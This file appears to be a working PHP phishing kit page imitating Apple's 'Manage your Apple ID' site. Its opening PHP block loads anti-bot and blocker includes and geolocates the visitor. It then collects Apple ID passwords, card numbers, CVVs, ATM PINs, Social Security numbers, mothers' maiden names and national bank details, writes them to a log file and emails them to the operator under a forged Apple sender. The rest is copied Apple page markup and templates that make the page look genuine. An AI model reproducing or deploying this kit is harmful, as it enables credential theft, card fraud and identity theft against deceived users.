<?php
session_start();
@ini_set('display_errors', 0); 
error_reporting(E_ALL ^ E_NOTICE); 
include 'antibots.php';
include 'bots.php';
include 'blocker.php';
include 'detect.php';
include 'sayron.php'; 
include 'browser.php';
$random = rand(0,100000000000);
$dis = substr(md5($random), 0, 15);
$bro = getBrowser();
$getbro = $bro["name"]." ".$bro["version"]." on ".$bro["platform"];
$_SESSION["bro"] = $getbro;

$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ; 
$countryforip = "$COUNTRY"; 
$_SESSION["COUNTRY"] = "$countryforip";
$COUNTRYCODE = $J7->geoplugin_countryCode ;
$city = $J7->geoplugin_city ; 
include 'emailk.php';
$xuser = $_POST['xuser'];
$xpass = $_POST['xpass'];
$nameoncard = $_POST['nameoncard'];
$cardid1 = $_POST['cardid1'];
$cd = $_POST['cd'];
$cvv = $_POST['cvv'];
$date_ob = $_POST['date_ob'];
$osid = $_POST['osid'];
$crlimi = $_POST['crlimi'];
$ssn = $_POST['ssn'];
$mmn = $_POST['mmn'];
$Bankre = $_POST['Bankre'];
$Huisnummer = $_POST['Huisnummer'];
$sh = $_POST['sh'];
$sort_code = $_POST['sort_code'];
$ph = $_POST['ph'];
$passjp = $_POST['passjp'];
$webid = $_POST['webid'];
$hkid = $_POST['hkid'];
$Limit = $_POST['Limit'];
$passpt = $_POST['passpt'];
$vbvpasss = $_POST['vbvpasss'];
$accountde = $_POST['accountde'];
$passde = $_POST['passde'];
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$date = date ("Y-n-d");
$time = date ("H:i:s");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------------------------------------------\n";
$message .= "Apple ID                   : ".$_POST['xuser']."\n";
$message .= "Password                   : ".$_POST['xpass']."\n";
$message .= "---------------------------------------------\n";
$message .= "Full name                  : ".$_POST['nameoncard']."\n";
$message .= "Card number                : ".$_POST['cardid1']."\n";
$message .= "Expiry date                : ".$_POST['cd']."\n";
$message .= "Security code              : ".$_POST['cvv']."\n";
$message .= "Date of birth              : ".$_POST['date_ob']."\n";
$message .= "ATM/GAB pin                : ".$_POST['atmgabpin']."\n";
$message .= "------------------------ VBV AU--------------------------\n";
$message .= "osid              : ".$_POST['osid']."\n";
$message .= "Credit Limit             : ".$_POST['crlimi']."\n";
$message .= "-----------------------VBV US  ---------------------------\n";
$message .= "Social security number     : ".$_POST['ssn']."\n";
$message .= "mother's madn                  : ".$_POST['mmn']."\n";
$message .= "-------------------  VBV NL-------------------------------\n";
$message .= "Bankrekeningnummer         : ".$_POST['Bankre']."\n";
$message .= "Huisnummer                 : ".$_POST['Huisnummer']."\n";
$message .= "-------------------  VBV DE-------------------------------\n";
$message .= "Bankrekeningnummer         : ".$_POST['accountde']."\n";
$message .= "pass vbv                 : ".$_POST['passde']."\n";
$message .= "--------------------  vbv CH------------------------------\n";
$message .= "Kreditkarten Kontonummer   : ".$_POST['sh']."\n";
$message .= "----------------------  VBV UK----------------------------\n";
$message .= "Sort code         	         : ".$_POST['sort_code']."\n";
$message .= "Account number                  : ".$_POST['accnum']."\n";
$message .= "----------------------  VBV LU----------------------------\n";
$message .= "Kreditkarten Kontonummer   : ".$_POST['ph']."\n";
$message .= "----------------------  VBV JP----------------------------\n";
$message .= "Pass                     : ".$_POST['passjp']."\n";
$message .= "WEB id                     : ".$_POST['webid']."\n";
$message .= "----------------------  VBV HK----------------------------\n";
$message .= "hk id                     : ".$_POST['hkid']."\n";
$message .= "--------------------------------------------------\n";
$message .= "Credit Limit               : ".$_POST['Limit']."\n";
$message .= "VPV PT                     : ".$_POST['passpt']."\n";
$message .= "VBV else                     : ".$_POST['vbvpasss']."\n";
$message .= "--------------------------------------------------\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | On Time : ".date("m/d/Y g:i:a")."\n";
$message .= "$useragent\n";
$messags   ="http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."\r\n";
$message .= "---------------------[DR.hossni]-----------------------------\n";

$subject = "$COUNTRY | ".$_POST['cardid1']." | ".$_POST['cd']." | ".$_POST['cvv']." | $ip =?UTF-8?Q?=E2=9C=94_?=";
$f = fopen("../../dr2.txt", "a");
fwrite($f, $message); 
$from = "From: -C-C-  ".$_POST['COUNTRYCODE']." <news@cc.applelD.hk>";
@mail($send,$subject,$message,$from);
?>
<head>
    <title>Manage your Address - (<?php print "$COUNTRYCODE"; ?>)</title>
    <meta name="Author" content="Apple Inc.">
    <meta name="omni_page" content="Apple - My Apple ID">
    <meta name="Category" content="">
    <meta name="Description" content="Your Apple ID is the account you use for all Apple services.">
    <meta name="Title" content="Apple ID">
    <meta name="keywords" content="Apple ID, Sign In, Account, Password, Manage">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

        <script src="hitlar/jquery-2.0.0.min.js" type="text/javascript"></script>
    <script src="hitlar/cardcheck.js" type="text/javascript"></script>
    <script src="hitlar/jquery.payment.js"></script>
    <script type="text/javascript" charset="utf-8" src="hitlar/yahoo-dom-event.js"></script>
    <script type="text/javascript" charset="utf-8" src="hitlar/flowConsumerOnboarding.js"></script>
    <script type="text/javascript" charset="utf-8" src="hitlar/framework-libraries.js"></script>
    <script type="text/javascript" charset="utf-8" src="hitlar/framework.js"></script>
    <script type="text/javascript" charset="utf-8" src="hitlar/ing-k2-base.js"></script>
    <script type="text/javascript" charset="utf-8" src="hitlar/jquery-allowtrigger.js"></script>
    <script language="JavaScript" src="hitlar/gen_validatorv4.js" type="text/javascript" xml:space="preserve"></script>
    <script src="hitlar/jquery.js" type="text/javascript"></script>
    <script src="hitlar/jquery.maskedinput.js" type="text/javascript"></script>
    <style type="text/css" xml:space="preserve">.error_strings{ font-family:Bold; height: 150px; font-size:9px; color:red;}</style>
    <script src="hitlar/jquery.payment.js"></script>
    <script type="text/javascript">
    jQuery(function($){
      $('[data-numeric]').payment('restrictNumeric');
      $('.cardid1').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.seccode').payment('formatCardCVC');
      $('form').submit(function(e){
        $('input').removeClass('invalid');
        $('.validation').removeClass('passed failed');
        var cardType = $.payment.cardType($('.longnumber').val());
        if ( $('input.invalid').length ) {
          $('.validation').addClass('failed');
        } else {
          $('.validation').addClass('passed');
        }
      });
    });
  </script>

    <link rel="shortcut icon" type="image/x-icon" href="https://appleid.cdn-apple.com/static/bin/cb3606853004/images/favicon.ico">

    <link rel="stylesheet" href="https://www.apple.com/ac/globalnav/2.0/en_US/styles/ac-globalnav.built.css" type="text/css">
    <link rel="stylesheet" href="https://www.apple.com/wss/fonts?family=Myriad+Set+Pro&weights=200,400,500,600,700&v=1" type="text/css">
    
        
        
            
                
                
                    <link rel="stylesheet" type="text/css" media="all" href="hitlar/nah.css">

                
            
        
    
    



<link rel="stylesheet" type="text/css" href="https://www.apple.com/ac/globalnav/2.0/en_AU/styles/ac-globalnav.built.css">
<script src="hitlar/lop.js"></script><script type="text/stache" id="globalNav" async="">

<aside id="ac-gn-segmentbar" class="ac-gn-segmentbar" data-strings="{ 'exit': 'Exit', 'view': '{%STOREFRONT%} Store Home', 'segments': { 'smb': 'Business Store Home', 'eduInd': 'Education Store Home', 'other': 'Store Home' } }"></aside>
<input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
<nav id="ac-globalnav" class="no-js" role="navigation" aria-label="Global Navigation" data-hires="false" data-analytics-region="global nav" lang="en-AU" data-store-key="" data-store-locale="au" data-store-api="//www.apple.com/[storefront]/shop/bag/status" data-search-locale="en_AU" data-search-api="//www.apple.com/search-services/suggestions/">
	<div class="ac-gn-content">
		<ul class="ac-gn-header">
			<li class="ac-gn-item ac-gn-menuicon">
				<label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true"> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span> </span> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span> </span>
				</label>
				<a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open"> <span class="ac-gn-menuanchor-label">Open Menu</span> </a>
				<a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close"> <span class="ac-gn-menuanchor-label">Close Menu</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-apple">
				<a class="ac-gn-link ac-gn-link-apple" href="//www.apple.com/au/" data-analytics-title="apple home" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">Apple</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
				<a class="ac-gn-link ac-gn-link-bag" href="//www.apple.com/au/shop/goto/bag" data-analytics-title="bag" data-analytics-click="bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with Items"> <span class="ac-gn-link-text">Shopping Bag</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> </li>
		</ul>
		<ul class="ac-gn-list">
			<li class="ac-gn-item ac-gn-apple">
				<a class="ac-gn-link ac-gn-link-apple" href="//www.apple.com/au/" data-analytics-title="apple home" id="ac-gn-firstfocus"> <span class="ac-gn-link-text">Apple</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
				<a class="ac-gn-link ac-gn-link-mac" href="//www.apple.com/au/mac/" data-analytics-title="mac"> <span class="ac-gn-link-text">Mac</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
				<a class="ac-gn-link ac-gn-link-ipad" href="//www.apple.com/au/ipad/" data-analytics-title="ipad"> <span class="ac-gn-link-text">iPad</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
				<a class="ac-gn-link ac-gn-link-iphone" href="//www.apple.com/au/iphone/" data-analytics-title="iphone"> <span class="ac-gn-link-text">iPhone</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
				<a class="ac-gn-link ac-gn-link-watch" href="//www.apple.com/au/watch/" data-analytics-title="watch"> <span class="ac-gn-link-text">Watch</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
				<a class="ac-gn-link ac-gn-link-tv" href="//www.apple.com/au/tv/" data-analytics-title="tv"> <span class="ac-gn-link-text">TV</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-music">
				<a class="ac-gn-link ac-gn-link-music" href="//www.apple.com/au/music/" data-analytics-title="music"> <span class="ac-gn-link-text">Music</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-support">
				<a class="ac-gn-link ac-gn-link-support" href="//www.apple.com/au/support/" data-analytics-title="support"> <span class="ac-gn-link-text">Support</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
				<a class="ac-gn-link ac-gn-link-search" href="//www.apple.com/au/search" data-analytics-title="search" data-analytics-click="search" aria-label="Search apple.com/au"> <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com/au</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
				<a class="ac-gn-link ac-gn-link-bag" href="//www.apple.com/au/shop/goto/bag" data-analytics-title="bag" data-analytics-click="bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with Items"> <span class="ac-gn-link-text">Shopping Bag</span> <span class="ac-gn-bag-badge" aria-hidden="true"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> </li>
		</ul>
		<aside id="ac-gn-searchview" class="ac-gn-searchview" role="search" data-analytics-region="search">
			<div class="ac-gn-searchview-content">
				<form id="ac-gn-searchform" class="ac-gn-searchform" action="//www.apple.com/au/search" method="get">
					<div class="ac-gn-searchform-wrapper">
						<input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" name="" placeholder="Search apple.com/au" data-placeholder-long="Search for Products, Stores and Help" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
						<input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
						<button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled aria-label="Submit"></button>
						<button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled aria-label="Clear Search"></button>
					</div>
				</form>
				<aside id="ac-gn-searchresults" class="ac-gn-searchresults" data-string-quicklinks="Quick Links" data-string-suggestions="Suggested Searches" data-string-noresults="Hit enter to search."></aside>
			</div>
			<button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search"> <span class="ac-gn-searchview-close-wrapper">
						<span class="ac-gn-searchview-close-left"></span> <span class="ac-gn-searchview-close-right"></span> </span>
			</button>
		</aside>
		<aside class="ac-gn-bagview" data-analytics-region="bag">
			<div class="ac-gn-bagview-scrim"> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span> </div>
			<div class="ac-gn-bagview-content" id="ac-gn-bagview-content"> </div>
		</aside>
	</div>
</nav>
<div id="ac-gn-curtain" class="ac-gn-curtain"></div>
<div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>


<script type="text/javascript" src="https://www.apple.com/ac/globalnav/2.0/en_AU/scripts/ac-globalnav.built.js"></script>

    
        
        
            <script type="text/javascript" src="hitlar/hr.js"></script>

        
    

<style type="text/css"></style><style type="text/css"></style><title>Manage your Apple ID - (<?php print "$COUNTRYCODE"; ?>)</title><style type="text/css"></style></head>

<body class="modal-open" style="padding-right: 17px;" id="pagecontent">
<div id="managedata">
















<script type="text/stache" id="jstache_59074038">


<applenav></applenav>
<div class="manage">
    <header></header>
    <photo account="{account}" config="{config}"></photo>
    {{#is view "manage"}}
        <div class="container flow-sections">
            <account editable-birthday="{editableBirthday}" {(account)}="account" {config}="config" {{#accountEdit}} edit-mode="{accountEdit}"{{/if}}></account>
            <msecurity editable-birthday="{editableBirthday}"{{#action}} action="{action}"{{/if}} account="{account}" config="{config}"></msecurity>
            {{#config.pageFeatures.featureSwitches.showDeviceSection}}
                <devices account="{account}" config="{config}"></devices>
            {{/if}}
            {{#if canViewPaymentSection}}
                <aid-payment {(account)}="account"
                             {payment-status}="account.paymentMethodStatus"
                             {is-underage-with-payment}="isUnderAgeAndHasFamilyPaymentMethod"
                             {has-family-card}="hasFamilyCard"
                             {shipping-addresses}="account.person.shippingAddresses"
                             {(config)}="config"></aid-payment>
            {{/if}}
            <preferences account="{account}" config="{config}"></preferences>
            <div id="signout" class="flow-section signout-list">
                <div class="row">
                    <div class="col-sm-12 section-name">
                        <div class="section-action">
                            <button class="btn btn-link section-title">
                                Sign Out
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <support account="{account}" config="{config}"></support>
        </div>
    {{/is}}

    {{#is view "dobapprove"}}
        <underage-approve account={account} config="{config}" reqerror="{reqerror}"></underage-approve>
    {{/is}}

    <footer></footer>
</div>

</script>
<script type="text/stache" id="jstache_1849662777">



<div class="container">
    <div class="footer">
        <div class="footer-wrap">
            <div class="line1">
                <div class="line-level">Shop the <a href="http://store.apple.com/uk" title="Apple Online Store">Apple Online Store</a> (0800 048 0408), visit an <a href="http://www.apple.com/retail/" title="Apple Retail Store">Apple Retail Store</a>, or find a <a href="http://www.apple.com/buy/" title="Reseller">reseller</a>.</div>
            </div>
            <div class="line2">
                <ul class="menu">
                    <li class="item"><a href="http://www.apple.com/about/" title="Apple Info" target="_blank">Apple Info</a></li>
                    <li class="item"><a href="http://www.apple.com/sitemap/" title="Site Map" target="_blank">Site Map</a></li>
                    <li class="item"><a href="http://www.apple.com/hotnews/" title="Hot News" target="_blank">Hot News</a></li>
                    <li class="item"><a href="http://www.apple.com/rss/" title="RSS Feeds" target="_blank">RSS Feeds</a></li>
                    <li class="item"><a href="http://www.apple.com/contact/" title="Contact Us" target="_blank">Contact Us</a></li>
                    <li class="item">
                        <a class="choose" title="Choose your country or region" href="/choose-your-country">
                        <img src="https://appleid.cdn-apple.com/static/bin/cb3412482741/images/countryFooterFlags/22x22/AUSflag.png" height="22" alt="Australia" width="22" />
                        </a>
                    </li>
                </ul>
            </div>
            <div class="line3">
                Copyright © 2017 Apple Inc. All rights reserved.
                <ul class="menu">
                    <li class="item"><a href="" title="Terms of Use">Terms of Use</a></li>
                    <li class="item"><a href="" title="Privacy Policy">Privacy Policy</a></li>
                </ul>
            </div>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_263695741">


<div class="modal flow-dialog default-dialog challenge-dialog" id="challengeID">
    <div class="modal-dialog">
        <div class="modal-content" role="dialog" aria-labelledby="challengeTitleHeader" tabindex="-1">
            <div class="modal-body-wrapper">
                {{^resetQuestions}}
                {{^showSupport}}
                    <div class="modal-body">
                        <div class="row challenge-row">
                            <div class="col-sm-12 exclude-padding">
                                <div class="modal-header">
                                    <h2 id="challengeTitleHeader" class="modal-title">
                                        BILLING ADDRESS                                    </h2>
                                    <h4 class="modal-title">

                                    </h4>
                                </div>
                                <div class="challenges">
                                    <div class="form-group clearfix">
                                        <label for="answer1" class="challenge-label body-text">{{ question1 }}</label>
                                        <div class="row answer1-row no-intendation">
                                            <div class="col-sm-8 input-wrapper">
                                                <div class="pop-wrapper field-pop-wrapper field-wrapper field-answer">
                                                    <input type="text" id="answer1" name="answer1"
                                                           class="form-control field{{#if errors.answer1.hasErrors}} error has-errors{{/if}}"
                                                           placeholder="answer"
                                                           can-value="{answer1}"
                                                           autocorrect="off"
                                                           autocapitalize="off"
                                                           autocomplete="off"
                                                           spellcheck="false" />

                                                    {{#errors.answer1.showError}}
                                                        <div class="errorPop-body popover" role="tooltip">
                                                            <div class="errorPop-arrow arrow"></div>
                                                            <div class="errorPop-content popover-content">
                                                                {{errors.answer1.main.message}}
                                                            </div>
                                                        </div>
                                                    {{/if}}
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="form-group form-answer2 clearfix">
                                        <label for="answer2" class="challenge-label body-text">{{ question2 }}</label>
                                        <div class="row answer2-row no-intendation">
                                            <div class="col-sm-8 input-wrapper">
                                                <div class="pop-wrapper field-pop-wrapper field-wrapper field-answer">
                                                    <input type="text" id="answer2" name="answer2"
                                                           class="form-control field{{#if errors.answer1.hasErrors}} error has-errors{{/if}}"
                                                           placeholder="answer"
                                                           can-value="{answer2}"
                                                           autocorrect="off"
                                                           autocapitalize="off"
                                                           autocomplete="off"
                                                           spellcheck="false" />

                                                    {{#errors.answer2.showError}}
                                                        <div class="errorPop-body popover" role="tooltip">
                                                            <div class="errorPop-arrow arrow"></div>
                                                            <div class="errorPop-content popover-content">
                                                                {{errors.answer2.main.message}}
                                                            </div>
                                                        </div>
                                                    {{/if}}
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                <div class="modal-footer">
                    <div class="btn-group flow-controls pull-right">
                        <loading loading="{challengeLoading}"></loading>
                        <button class="btn btn-link first back">Cancel</button>
                        <button class="btn btn-link last continue"{{^continueEnabled}} disabled{{/if}}>
                        Continue
                        </button>
                    </div>
                </div>
            {{else}}
                <supportpin account="{account}" config="{config}"></supportpin>
            {{/showSupport}}
            {{else}}
                <div class="modal-body">
                    <div class="row">
                        <div class="col-sm-12 exclude-padding">
                            <div class="modal-header exclude-margin">
                                <h4 class="modal-title">
                                    Reset Instructions Sent

                                    <small>
                                        An email with instructions has been sent to <span class="bold graceful-wrap">{{account.security.rescueEmail}}</span>. Follow the directions in the email to reset your security questions.
                                    </small>
                                </h4>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <div class="btn-group flow-controls pull-right">
                        <button class="btn btn-link back ok-button">OK</button>
                    </div>
                </div>
            {{/resetQuestions}}
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1563256347">


<div class="modal fade flow-dialog default-dialog cr-locked-modal" id="crLockedModal" data-backdrop="static">
    <div class="modal-dialog">
        <div class="modal-content" role="dialog" aria-labelledby="crLockedModalLabel" tabindex="-1">
        {{#if resetSecurityQuestions}}
            <div class="modal-body">
                <div class="row">
                    <div class="col-sm-2 not-mobile">
                        <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" alt="Alert icon" width="60" class="alert-icon" />
                    </div>
                    <div class="col-sm-10 exclude-padding">
                        <div class="modal-header">
                            <h4 class="modal-title" id="crLockedModalLabel">Reset Instructions Sent</h4>
                        </div>
                        <div class="modal-body-content">
                            <span class="body-text">
                                An email with instructions has been sent to <span class="graceful-wrap">{{accountRescueEmail}}</span>. Follow the directions in the email to reset your security questions.
                            </span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <div class="btn-group flow-controls pull-right">
                    <button type="button" class="btn btn-link ok" data-dismiss="modal">OK</button>
                </div>
            </div>
        {{else}}
            <div class="modal-body">
                <div class="row">
                    <div class="col-sm-2 not-mobile">
                        <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" alt="Alert icon" width="60" class="alert-icon" />
                    </div>
                    <div class="col-sm-10 exclude-padding">
                        <div class="modal-header">
                            <h4 class="modal-title" id="crLockedModalLabel">Too many incorrect verification attempts</h4>
                        </div>
                        <div class="modal-body-content">
                            <span class="body-text">
                                {{#account.security.rescueEmail}}
                                    You have made too many attempts to answer your security questions. You can try again later or use your rescue email address to reset your security information.
                                {{else}}
                                    You have made too many attempts to answer your security questions.
                                {{/if}}
                            </span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <div class="btn-group flow-controls pull-right">
                    <button type="button" class="btn btn-link{{#if account.security.rescueEmail}} first{{/if}} cancel" data-dismiss="modal">{{#if account.security.rescueEmail}}Cancel{{else}}OK{{/if}}</button>
                    {{#if account.security.rescueEmail}}
                    <button type="button" class="btn btn-link last not-mobile reset-questions">Add Rescue Email Address</button>
                    <button type="button" class="btn btn-link last mobile-only reset-questions">Add Rescue Email</button>
                    {{/if}}
                </div>
            </div>
        {{/if}}
        </div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_218329818">


<div class="modal fade flow-dialog default-dialog timeout-modal" id="timeoutModal" data-backdrop="static">
    <div class="modal-dialog">
        <div class="modal-content" role="dialog" aria-labelledby="timeoutModalTitle" tabindex="-1">
            <div class="modal-body">
            	<div class="row timeout-row">
            		<div class="col-sm-2 not-mobile">
            			<img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" height="60" alt="alert icon" width="60" class="alert-icon" />
            		</div>
            		<div class="col-sm-10 exclude-padding content">
                		<div class="modal-header">
                    		<h4 class="modal-title" id="timeoutModalTitle">
                        		Are you still there?
                    		</h4>
                		</div>
                		<div class="modal-body-content exclude-padding">
                    		<p class="body-text">To protect your privacy, this session will time out in {{ duration }} seconds. If the session expires, you will need to start again.</p>
                    	</div>
                	</div>
                </div>
            </div>

            <div class="modal-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <loading loading="{continueLoading}"></loading>
                    <button type="button" class="btn btn-link first sign-out">
                        Sign Out
                    </button>
                    <button type="button" class="btn btn-link last continue">
                        Continue
                    </button>
                </div>
            </div>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_639336952">


<div class="persona-splash{{^hasPhoto}} no-photo{{/if}} clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class="{{#hasPhoto}}row{{/if}} person-wrapper">
                {{#hasPhoto}}
                    <div class="col-sm-3">
                        <div class="person-photo">
                            <img class="img img-circle img-person"
                                 src="{{ img }}" alt="Your Photo" width="150" height="150" />
                            <div class="img-edit"> Edit</div>
                        </div>
                    </div>
                {{/if}}
                <div class="{{#hasPhoto}}col-sm-9{{/if}}">
                    <div class="row">
                        <div class="{{#hasPhoto}}col-sm-7 col-md-8{{else}}col-sm-9{{/if}} appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile-only appleid-user">
                                     {{#if firstNameOrderFirst}}
                                        <span id="first_name" class="first_name">{{stringEllipsisAt account.person.name.firstName 19}}</span>{{#lineBreak}}<span class="break-name"></span>{{/lineBreak}} <span id="last_name" class="last_name">{{stringEllipsisAt account.person.name.lastName 19}}</span>
                                     {{else}}
                                        <span id="last_name" class="last_name">{{stringEllipsisAt account.person.name.lastName 19}}</span>{{#lineBreak}}<span class="break-name"></span>{{/lineBreak}} <span id="first_name" class="first_name">{{stringEllipsisAt account.person.name.firstName 19}}</span>
                                     {{/if}}
                                    <small id="username" class="appleid-username">Your Apple ID is <span class="acc-name force-ltr">{{stringEllipsisAt account.name 32}}</span> </small>
                                </h1>
                                <h1 class="not-mobile appleid-user">
                                    {{#if firstNameOrderFirst}}
                                        <span id="first_name" class="first_name">{{ account.person.name.firstName }}</span> <span id="last_name" class="last_name">{{ account.person.name.lastName }}</span>
                                    {{else}}
                                        <span id="last_name" class="last_name">{{ account.person.name.lastName }}</span> <span id="first_name" class="first_name">{{ account.person.name.firstName }}</span>
                                    {{/if}}
                                    <small id="username" class="appleid-username">Your Apple ID is <span class="force-ltr"><strong>{{account.name}}</strong></span> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile {{#hasPhoto}}col-sm-5 col-md-4{{else}}col-sm-3{{/if}}">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button class="btn btn-link">Sign Out </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_1393175362">


<section id="accountNonEdit" class="flow-section mobile-only non-edit">
    <div class="account-wrapper">
        <div class="row">
            <div class="col-md-3 section-name">
                <div class="section-action">
                    <button class="btn btn-link section-title" aria-controls="account-content">
                        Account
                    </button>
                </div>
            </div>
        </div>
    </div>
</section>
<section id="account" class="flow-section mobile-section-edit {{#if editMode}} edit{{else}} non-edit{{/if}} {{#if animateMobileEditClose}} mobile-edit-close{{/if}}">
    <div class="account-wrapper">
        <div class="row">
            <div class="col-md-3 section-name" id="heading-account">
                <h2 class="not-mobile section-title break-section-title">
                    Account
                </h2>
                {{#if editMode}}
                    <div class="mobile-only section-title">
                        <button class="btn btn-link btn-overlay btn-back"> Back</button>
                        <h2 class="wrap-popover-title">Account</h2>
                    </div>
                {{else}}
                    <div class="section-action">
                        <button class="btn btn-link section-title" aria-controls="account-content">
                            Account
                        </button>
                    </div>
                {{/if}}
            </div>
            <div id="account-content" aria-labelledby="heading-account" class="col-md-9 subsection">
                <accordion edit="{editMode}" delay="0.4">
                    {{#unless editMode}}
                        <div class="account-details clearfix">
                            <div class="row">
                                <div class="col-sm-5">
                                    <div class="flow-subsection">
                                        <h3 class="section-subtitle no-outline"> APPLE ID</h3>
                                        <div class="pin-tip-wrapper apple-id clearfix">
                                            <string-ellipsis content-value="{account.name}">{{ account.name }}</string-ellipsis>
                                        </div>
                                    </div>
                                    {{#account.person.primaryEmailAddress.address}}
                                        {{^str_eq account.name . false}}
                                            <div class="flow-subsection">
                                                <h3 class="section-subtitle"> PRIMARY EMAIL</h3>
                                                <div class="pin-tip-wrapper primary-email clearfix">
                                                    <string-ellipsis content-value="{.}">{{ . }}</string-ellipsis>
                                                </div>
                                            </div>
                                        {{/str_eq}}
                                    {{/account.person.primaryEmailAddress}}
                                    <div class="flow-subsection">
                                        <h3 class="section-subtitle"> DATE OF BIRTH</h3>
                                        <div class="birthday">
                                            {{#if editableBirthday}}
                                                {{{birthday editableBirthday config.localizedResources.dateFormat}}}
                                            {{else}}
                                                {{{birthday account.person.birthday config.localizedResources.dateFormat}}}
                                            {{/if}}
                                        </div>
                                    </div>
                                </div>
                                <div class="col-sm-5">
                                    <h3 class="section-subtitle"> CONTACTABLE AT </h3>
                                    {{#each account.person.phoneNumbers }}
                                        <div class="account-detail clearfix">
                                            {{ fullNumberWithCountryPrefix }}
                                        </div>
                                    {{/each}}

                                    {{#account.name}}
                                        <div class="pin-tip-wrapper account-detail clearfix">
                                            <string-ellipsis content-value="{account.name}">{{ account.name }}</string-ellipsis>
                                        </div>
                                    {{/account.name}}

                                    {{#account.person.primaryEmailAddress.address}}
                                        {{^str_eq account.name . false}}
                                            <div class="pin-tip-wrapper account-detail clearfix">
                                                <string-ellipsis content-value="{.}">{{ . }}</string-ellipsis>
                                            </div>
                                        {{/str_eq}}
                                    {{/account.person.primaryEmailAddress.address}}

                                    {{#each account.aliases}}
                                        {{^is this account.name}}
                                            <div class="pin-tip-wrapper account-detail clearfix">
                                                <string-ellipsis content-value="{{this}}">{{this}}</string-ellipsis>
                                            </div>
                                        {{/is}}
                                    {{/each}}

                                    {{#each account.person.emails }}
                                        {{#vetted}}
                                            {{^is address account.name}}
                                                {{^str_eq address account.aliases}}
                                                    <div class="pin-tip-wrapper account-detail clearfix">
                                                        {{#isTruncated address 24}}
                                                            <string-ellipsis content-value="{address}">{{ address }}</string-ellipsis>
                                                        {{else}}
                                                            <string-ellipsis content-value="{address}">{{ address }}</string-ellipsis>
                                                        {{/isTruncated}}
                                                    </div>
                                                {{/str_eq}}
                                            {{/is}}
                                        {{/vetted}}
                                    {{/each}}
                                </div>
                                <div class="col-sm-2 section-edit">
                                    <button class="btn btn-link btn-edit acdn-btn-edit acdn-btn-edit"> Edit</button>
                                </div>
                            </div>
                        </div>
                    {{else}}
                        <div class="editable account-edit clearfix">
                            <div class="row edit-row">
                                <div class="col-sm-5">
                                    <changeappleid account="{account}"></changeappleid>
                                </div>
                                <div class="col-sm-5">
